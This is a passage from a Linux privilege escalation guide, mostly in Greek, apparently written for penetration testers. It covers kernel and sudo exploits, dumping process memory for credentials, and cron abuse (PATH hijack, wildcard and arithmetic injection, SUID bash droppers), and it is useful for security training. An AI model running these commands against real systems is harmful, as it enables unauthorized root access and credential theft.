# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Πληροφορίες Συστήματος

### Πληροφορίες OS

Ας ξεκινήσουμε αποκτώντας κάποιες γνώσεις για το OS που τρέχει
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Διαδρομή

Αν **έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη μεταβλητή `PATH`** μπορεί να μπορέσετε να hijackάρετε κάποιες βιβλιοθήκες ή binaries:
```bash
echo $PATH
```
### Πληροφορίες Env

Ενδιαφέρουσες πληροφορίες, passwords ή API keys στις environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Ελέγξτε την έκδοση του kernel και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για privilege escalation
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Μπορείς να βρεις μια καλή λίστα ευάλωτων kernels και κάποια ήδη **compiled exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Άλλα sites όπου μπορείς να βρεις κάποια **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξαγάγεις όλες τις ευάλωτες εκδόσεις kernel από εκείνο το web μπορείς να κάνεις:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools που θα μπορούσαν να βοηθήσουν στην αναζήτηση kernel exploits είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτελέστε το ΣΤΟ victim, ελέγχει μόνο exploits για kernel 2.x)

Πάντα **αναζητήστε την έκδοση του kernel στο Google**, ίσως η έκδοση του kernel σας να αναφέρεται σε κάποιο kernel exploit και τότε θα είστε σίγουροι ότι αυτό το exploit είναι έγκυρο.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Έκδοση Sudo

Βασισμένο στις ευάλωτες εκδόσεις sudo που εμφανίζονται σε:
```bash
searchsploit sudo
```
Μπορείς να ελέγξεις αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Οι εκδόσεις του Sudo πριν από την 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) επιτρέπουν σε τοπικούς χρήστες χωρίς προνόμια να κλιμακώσουν τα προνόμιά τους σε root μέσω της επιλογής sudo `--chroot` όταν το αρχείο `/etc/nsswitch.conf` χρησιμοποιείται από έναν κατάλογο που ελέγχει ο χρήστης.

Ορίστε ένα [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) για να εκμεταλλευτείτε αυτήν την [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Πριν εκτελέσετε το exploit, βεβαιωθείτε ότι η έκδοση του `sudo` σας είναι ευάλωτη και ότι υποστηρίζει τη δυνατότητα `chroot`.

Για περισσότερες πληροφορίες, ανατρέξτε στο αρχικό [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

Το Sudo πριν από την 1.9.17p1 (αναφερόμενο εύρος που επηρεάζεται: **1.8.8–1.9.17**) μπορεί να αξιολογεί host-based sudoers rules χρησιμοποιώντας το **hostname που παρέχεται από τον χρήστη** από το `sudo -h <host>` αντί για το **πραγματικό hostname**. Αν το sudoers δίνει ευρύτερα προνόμια σε άλλον host, μπορείτε να τον **spoof** τοπικά.

Requirements:
- Ευάλωτη έκδοση του sudo
- Host-specific sudoers rules (ο host δεν είναι ούτε το τρέχον hostname ούτε `ALL`)

Example sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Εκμετάλλευση με spoofing του επιτρεπόμενου host:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Αν η επίλυση του spoofed ονόματος μπλοκάρει, πρόσθεσέ το στο `/etc/hosts` ή χρησιμοποίησε ένα hostname που ήδη εμφανίζεται σε logs/configs για να αποφύγεις DNS lookups.

#### sudo < v1.8.28

Από @sickrov
```
sudo -u#-1 /bin/bash
```
### Η επαλήθευση υπογραφής Dmesg απέτυχε

Δες το **smasher2 box of HTB** για ένα **παράδειγμα** του πώς θα μπορούσε να εκμεταλλευτεί αυτή η ευπάθεια
```bash
dmesg 2>/dev/null | grep "signature"
```
### Περισσότερη system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Καταγραφή πιθανών defenses

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### Παx
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Αν βρίσκεστε μέσα σε ένα container, ξεκινήστε με την παρακάτω ενότητα container-security και έπειτα pivot into τις runtime-specific abuse pages:


{{#ref}}
container-security/
{{#endref}}

## Drives

Ελέγξτε **τι είναι mounted και unmounted**, πού και γιατί. Αν κάτι είναι unmounted, μπορείτε να δοκιμάσετε να το mount και να ελέγξετε για private info
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Χρήσιμο λογισμικό

Απαρίθμηση χρήσιμων binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Επίσης, έλεγξε αν **υπάρχει εγκατεστημένος οποιοσδήποτε compiler**. Αυτό είναι χρήσιμο αν χρειάζεται να χρησιμοποιήσεις κάποιο kernel exploit, καθώς συνιστάται να το κάνεις compile στο μηχάνημα όπου πρόκειται να το χρησιμοποιήσεις (ή σε κάποιο παρόμοιο)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Ευάλωτο Εγκατεστημένο Λογισμικό

Έλεγξε την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση Nagios (για παράδειγμα) που θα μπορούσε να αξιοποιηθεί για κλιμάκωση προνομίων…\
Συνιστάται να ελέγχεις χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Αν έχετε πρόσβαση SSH στο μηχάνημα, μπορείτε επίσης να χρησιμοποιήσετε **openVAS** για να ελέγξετε για παρωχημένο και ευάλωτο λογισμικό που είναι εγκατεστημένο μέσα στο μηχάνημα.

> [!NOTE] > _Σημειώστε ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες που ως επί το πλείστον θα είναι άχρηστες, επομένως συνιστάται εφαρμογές όπως το OpenVAS ή παρόμοια, που θα ελέγχουν αν οποιαδήποτε εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits_

## Processes

Ρίξτε μια ματιά στο **ποια processes** εκτελούνται και ελέγξτε αν κάποιο process έχει **περισσότερα privileges από όσα θα έπρεπε** (ίσως ένα tomcat που εκτελείται από root?)
```bash
ps aux
ps -ef
top -n 1
```
Πάντα να ελέγχεις για πιθανούς [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** ανιχνεύει αυτά ελέγχοντας την παράμετρο `--inspect` μέσα στη command line της process.\
Επίσης **έλεγξε τα privileges σου πάνω στα binaries των processes**, ίσως μπορείς να κάνεις overwrite κάποιου.

### Cross-user parent-child chains

Μια child process που τρέχει κάτω από **διαφορετικό user** από τον parent της δεν είναι αυτόματα malicious, αλλά είναι ένα χρήσιμο **triage signal**. Κάποιες μεταβάσεις είναι αναμενόμενες (`root` spawning a service user, login managers creating session processes), αλλά ασυνήθιστες chains μπορούν να αποκαλύψουν wrappers, debug helpers, persistence ή αδύναμα runtime trust boundaries.

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Αν βρείς μια απρόσμενη αλυσίδα, εξέτασε τη command line του parent και όλα τα files που επηρεάζουν τη συμπεριφορά του (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Σε αρκετά πραγματικά privesc paths το ίδιο το child δεν ήταν writable, αλλά το **parent-controlled config** ή η helper chain ήταν.

### Deleted executables and deleted-open files

Τα runtime artifacts είναι συχνά ακόμα προσβάσιμα **μετά τη διαγραφή**. Αυτό είναι χρήσιμο τόσο για privilege escalation όσο και για την ανάκτηση evidence από ένα process που έχει ήδη sensitive files open.

Έλεγξε για deleted executables:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Αν το `/proc/<PID>/exe` δείχνει σε `(deleted)`, η διεργασία εξακολουθεί να εκτελεί την παλιά εικόνα του binary από τη μνήμη. Αυτό είναι ισχυρή ένδειξη για έρευνα επειδή:

- το αφαιρεμένο εκτελέσιμο μπορεί να περιέχει ενδιαφέροντα strings ή credentials
- η διεργασία που τρέχει μπορεί ακόμα να εκθέτει χρήσιμα file descriptors
- ένα διαγραμμένο privileged binary μπορεί να υποδεικνύει πρόσφατο tampering ή απόπειρα cleanup

Συλλογή deleted-open files καθολικά:
```bash
lsof +L1
```
Εάν βρεις έναν ενδιαφέρον descriptor, ανέκτησέ τον απευθείας:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν μια διεργασία έχει ακόμα ανοιχτό ένα διαγραμμένο secret, script, database export ή flag file.

### Process monitoring

Μπορείς να χρησιμοποιήσεις εργαλεία όπως [**pspy**](https://github.com/DominicBreuker/pspy) για να παρακολουθείς processes. Αυτό μπορεί να είναι πολύ χρήσιμο για να εντοπίσεις vulnerable processes που εκτελούνται συχνά ή όταν ικανοποιείται ένα σύνολο προϋποθέσεων.

### Process memory

Κάποιες υπηρεσίες ενός server αποθηκεύουν **credentials σε clear text μέσα στη memory**.\
Συνήθως θα χρειαστείς **root privileges** για να διαβάσεις τη memory processes που ανήκουν σε άλλους users, επομένως αυτό είναι συνήθως πιο χρήσιμο όταν είσαι ήδη root και θέλεις να ανακαλύψεις περισσότερα credentials.\
Ωστόσο, να θυμάσαι ότι **ως regular user μπορείς να διαβάσεις τη memory των processes που σου ανήκουν**.

> [!WARNING]
> Σημείωσε ότι σήμερα τα περισσότερα machines **δεν επιτρέπουν ptrace by default** πράγμα που σημαίνει ότι δεν μπορείς να κάνεις dump άλλα processes που ανήκουν στον unprivileged user σου.
>
> Το αρχείο _**/proc/sys/kernel/yama/ptrace_scope**_ ελέγχει την προσβασιμότητα του ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: όλα τα processes μπορούν να γίνουν debug, εφόσον έχουν το ίδιο uid. Αυτός είναι ο κλασικός τρόπος με τον οποίο λειτουργούσε το ptracing.
> - **kernel.yama.ptrace_scope = 1**: μόνο ένα parent process μπορεί να γίνει debug.
> - **kernel.yama.ptrace_scope = 2**: μόνο admin μπορεί να χρησιμοποιήσει ptrace, καθώς απαιτείται η δυνατότητα CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: κανένα process δεν μπορεί να γίνει traced με ptrace. Μόλις οριστεί, χρειάζεται reboot για να ενεργοποιηθεί ξανά το ptracing.

#### GDB

Αν έχεις πρόσβαση στη memory μιας υπηρεσίας FTP (για παράδειγμα) θα μπορούσες να πάρεις το Heap και να αναζητήσεις μέσα σε αυτό τα credentials της.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Για ένα δεδομένο process ID, το **maps δείχνει πώς είναι mapped η μνήμη μέσα στο** virtual address space αυτού του process· επίσης δείχνει τα **permissions κάθε mapped περιοχής**. Το pseudo file **mem** **exposes the processes memory itself**. Από το αρχείο **maps** ξέρουμε ποιες **memory regions είναι readable** και τα offsets τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **seek στο mem file και να dumpάρουμε όλες τις readable regions** σε ένα αρχείο.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

Το `/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος, όχι στην εικονική μνήμη. Ο εικονικός χώρος διευθύνσεων του kernel μπορεί να προσπελαστεί χρησιμοποιώντας /dev/kmem.\
Συνήθως, το `/dev/mem` είναι αναγνώσιμο μόνο από **root** και την ομάδα **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump για linux

Το ProcDump είναι μια επανερμηνεία για Linux του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Βρείτε το στο [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Για να κάνεις dump τη μνήμη μιας διεργασίας μπορείς να χρησιμοποιήσεις:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείς χειροκίνητα να αφαιρέσεις τις απαιτήσεις root και να κάνεις dump τη διεργασία που σου ανήκει
- Script A.5 από [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)

### Credentials from Process Memory

#### Manual example

Αν διαπιστώσεις ότι η διεργασία authenticator εκτελείται:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Μπορείς να κάνεις dump τη διεργασία (δες τις προηγούμενες ενότητες για να βρεις διαφορετικούς τρόπους να κάνεις dump τη μνήμη μιας διεργασίας) και να αναζητήσεις διαπιστευτήρια μέσα στη μνήμη:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **κλέψει clear text credentials από τη μνήμη** και από ορισμένα **well known files**. Απαιτεί root privileges για να λειτουργήσει σωστά.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Αν ένα web “Crontab UI” panel (alseambusher/crontab-ui) τρέχει ως root και είναι δεμένο μόνο στο loopback, μπορείς παρ’ όλα αυτά να το προσεγγίσεις μέσω SSH local port-forwarding και να δημιουργήσεις ένα privileged job για escalation.

Typical chain
- Discover loopback-only port (e.g., 127.0.0.1:8000) and Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Find credentials in operational artifacts:
- Backups/scripts with `zip -P <password>`
- systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Δημιούργησε μια εργασία υψηλών δικαιωμάτων και εκτέλεσέ την αμέσως (ρίχνει SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Χρησιμοποίησέ το:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Μην εκτελείτε το Crontab UI ως root; περιορίστε το με έναν dedicated user και ελάχιστα permissions
- Συνδέστε το στο localhost και επιπλέον περιορίστε την πρόσβαση μέσω firewall/VPN; μην επαναχρησιμοποιείτε passwords
- Αποφύγετε το embedding secrets σε unit files· χρησιμοποιήστε secret stores ή root-only EnvironmentFile
- Ενεργοποιήστε audit/logging για on-demand job executions



Ελέγξτε αν κάποιο scheduled job είναι vulnerable. Ίσως μπορείτε να εκμεταλλευτείτε ένα script που εκτελείται από root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Αν χρησιμοποιείται το `run-parts`, έλεγξε ποια ονόματα θα εκτελεστούν πραγματικά:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Αυτό αποφεύγει τα false positives. Ένας writable periodic directory είναι χρήσιμος μόνο αν το όνομα του payload σου ταιριάζει με τους τοπικούς κανόνες `run-parts`.

### Cron path

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείς να βρεις το PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Σημείωσε πώς ο χρήστης "user" έχει writing privileges over /home/user_)

Αν μέσα σε αυτό το crontab ο root user προσπαθήσει να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει το path. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\
Τότε, μπορείς να πάρεις ένα root shell χρησιμοποιώντας:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron χρησιμοποιώντας ένα script με wildcard (Wildcard Injection)

Εάν ένα script εκτελείται από root και έχει ένα “**\***” μέσα σε μια command, μπορείς να το εκμεταλλευτείς για να κάνεις απρόσμενα πράγματα (όπως privesc). Παράδειγμα:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Αν το wildcard προηγείται από ένα path όπως** _**/some/path/\***_ **, δεν είναι vulnerable (ακόμα και το** _**./\***_ **δεν είναι).**

Διάβασε την ακόλουθη σελίδα για περισσότερα wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Το Bash κάνει parameter expansion και command substitution πριν από την αριθμητική αξιολόγηση στα ((...)), $((...)) και let. Αν ένα root cron/parser διαβάζει untrusted log fields και τα περνά σε arithmetic context, ένας attacker μπορεί να inject ένα command substitution $(...) που εκτελείται ως root όταν τρέχει το cron.

- Γιατί λειτουργεί: Στο Bash, τα expansions γίνονται με αυτή τη σειρά: parameter/variable expansion, command substitution, arithmetic expansion, μετά word splitting και pathname expansion. Άρα μια τιμή όπως `$(/bin/bash -c 'id > /tmp/pwn')0` πρώτα αντικαθίσταται (εκτελώντας το command), και μετά το υπόλοιπο αριθμητικό `0` χρησιμοποιείται για την arithmetic, ώστε το script να συνεχίζει χωρίς errors.

- Τυπικό vulnerable pattern:
```bash
#!/bin/bash
# Παράδειγμα: parse ένα log και "sum" ένα count field που έρχεται από το log
while IFS=',' read -r ts user count rest; do
# το count είναι untrusted αν το log ελέγχεται από attacker
(( total += count ))     # ή: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Βάλε attacker-controlled κείμενο να γραφτεί στο parsed log ώστε το numeric-looking field να περιέχει ένα command substitution και να τελειώνει με ένα digit. Βεβαιώσου ότι το command σου δεν κάνει print στο stdout (ή κάνε redirect) ώστε η arithmetic να παραμένει valid.
```bash
# Injected field value μέσα στο log (π.χ. μέσω ενός crafted HTTP request που το app γράφει αυτούσιο):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# Όταν ο root cron parser αξιολογήσει το (( total += count )), το command σου θα τρέξει ως root.
```

### Cron script overwriting and symlink

Αν **μπορείς να τροποποιήσεις ένα cron script** που εκτελείται από root, μπορείς να πάρεις shell πολύ εύκολα:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Αν το script που εκτελείται από το root χρησιμοποιεί έναν **directory στον οποίο έχεις πλήρη πρόσβαση**, ίσως να είναι χρήσιμο να διαγράψεις αυτόν τον φάκελο και να **δημιουργήσεις έναν symlink folder προς έναν άλλο** που να εξυπηρετεί ένα script ελεγχόμενο από εσένα
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Επικύρωση symlink και ασφαλέστερος χειρισμός αρχείων

Όταν ελέγχετε privileged scripts/binaries που διαβάζουν ή γράφουν αρχεία μέσω path, επαληθεύστε πώς χειρίζονται τα links:

- Το `stat()` ακολουθεί ένα symlink και επιστρέφει metadata του target.
- Το `lstat()` επιστρέφει metadata του ίδιου του link.
- Τα `readlink -f` και `namei -l` βοηθούν να επιλυθεί το τελικό target και να εμφανιστούν τα permissions κάθε component του path.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Για defenders/developers, ασφαλέστερα patterns against symlink tricks include:

- `O_EXCL` with `O_CREAT`: αποτυγχάνει αν το path υπάρχει ήδη (μπλοκάρει attacker pre-created links/files).
- `openat()`: λειτουργεί σχετικά με ένα trusted directory file descriptor.
- `mkstemp()`: δημιουργεί temporary files ατομικά με secure permissions.

### Custom-signed cron binaries with writable payloads
Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Frequent cron jobs

Μπορείς να παρακολουθείς τις διεργασίες για να βρεις διεργασίες που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως μπορέσεις να το εκμεταλλευτείς και να κάνεις privilege escalation.

Για παράδειγμα, για να **παρακολουθείς κάθε 0.1s για 1 λεπτό**, **να ταξινομήσεις με βάση τις λιγότερο εκτελεσμένες εντολές** και να διαγράψεις τις εντολές που έχουν εκτελεστεί τις περισσότερες φορές, μπορείς να κάνεις:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα καταγράφει κάθε process που ξεκινά).

### Root backups that preserve attacker-set mode bits (pg_basebackup)

Αν ένα root-owned cron κάνει wrap το `pg_basebackup` (ή οποιοδήποτε recursive copy) πάνω σε έναν database directory στον οποίο μπορείτε να γράψετε, μπορείτε να φυτέψετε ένα **SUID/SGID binary** που θα αντιγραφεί ξανά ως **root:root** με τα ίδια mode bits στο backup output.

Τυπική ροή εντοπισμού (ως low-priv DB user):
- Χρησιμοποιήστε `pspy` για να εντοπίσετε ένα root cron που καλεί κάτι όπως `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` κάθε λεπτό.
- Επιβεβαιώστε ότι το source cluster (π.χ. `/var/lib/postgresql/14/main`) είναι writable από εσάς και ότι το destination (`/opt/backups/current`) γίνεται owned by root μετά το job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Αυτό λειτουργεί επειδή το `pg_basebackup` διατηρεί τα bits του file mode όταν αντιγράφει το cluster· όταν εκτελείται από root, τα αρχεία προορισμού κληρονομούν **root ownership + attacker-chosen SUID/SGID**. Οποιαδήποτε παρόμοια privileged backup/copy routine που διατηρεί permissions και γράφει σε executable location είναι vulnerable.

### Invisible cron jobs

